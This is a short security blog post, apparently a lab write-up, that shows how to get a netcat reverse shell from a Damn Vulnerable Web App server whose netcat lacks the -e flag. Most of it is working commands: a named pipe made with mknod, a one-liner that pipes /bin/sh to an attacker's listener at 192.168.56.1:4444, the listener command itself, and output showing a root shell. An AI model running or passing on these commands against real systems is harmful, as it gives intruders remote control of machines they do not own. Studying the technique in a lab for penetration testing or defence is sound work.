---
layout: post
title:  "Reverse Shell Without -e"
subtitle: "Notes, Tips, Tricks"
date:   2017-02-21 15:00:00 -0500
author: "coastal"
header-img: "images/notes-tips-tricks/nc-no-e-rev-shell.jpg"
---
I was looking into dropping a netcat reverse shell on the Damn Vulnerable Web App when I came across an issue, the ```-e``` flag was not supported on the server's implementation of netcat. This means that the go-to way of initiating a reverse shell from the victim server would not function:

```
nc 192.168.56.1 4444 -e /bin/sh
```

The ```-e``` flag denoting that the following command is executed on connection, it passes a shell to the receiving end of the connection (the attacker listening on the connecting address / port):

```
nc -nvlp 4444
```

I stumbled across a workaround by Ed Skoudis from SANS. I like it alot and, as it relies on a command that is (seemingly) not usually limited in terms of user-accession and does not require extra permissions, it should be a pretty broadly applicable workaround. 

The first step is to execute this command on the victim server:

```
mknod /tmp/backpipe p 
```

The description of the ```mknod``` man page is as follows:
>int mknod(const char *pathname, mode_t mode, dev_t dev); 

>The system call mknod() creates a filesystem node (file, device special file or named pipe) named pathname, with
>attributes specified by mode and dev.

So here we make a named temporary pipe with a (default) FIFO passthrough structure, designated by the flag ```p```, at the location ```/tmp/backpipe```. Next we execute this command on the victim:

```
/bin/sh 0</tmp/backpipe | nc 192.168.56.1 4444 1>/tmp/backpipe
```

Alright, so the first part of the pipe redirects the stdout of ```/tmp/backpipe``` to the stdin of ```/bin/sh```. The stdout of that chain is piped to our connection on ```nc 192.168.56.1 4444```. To complete the circle, the stdout of the```nc```  connection is chained to ```/tmp/backpipe```. What a cool workaround!

From an attacker's perspective, it looks like this:

```
coastal@coastal-LinuxBook:~$ nc -nvlp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.56.101] port 4444 [tcp/*] accepted (family 2, sport 53212)
whoami
root
hostname
owaspbwa
```

### References
[1. SANS Netcat Without -e][sans-nc]

[sans-nc]:https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem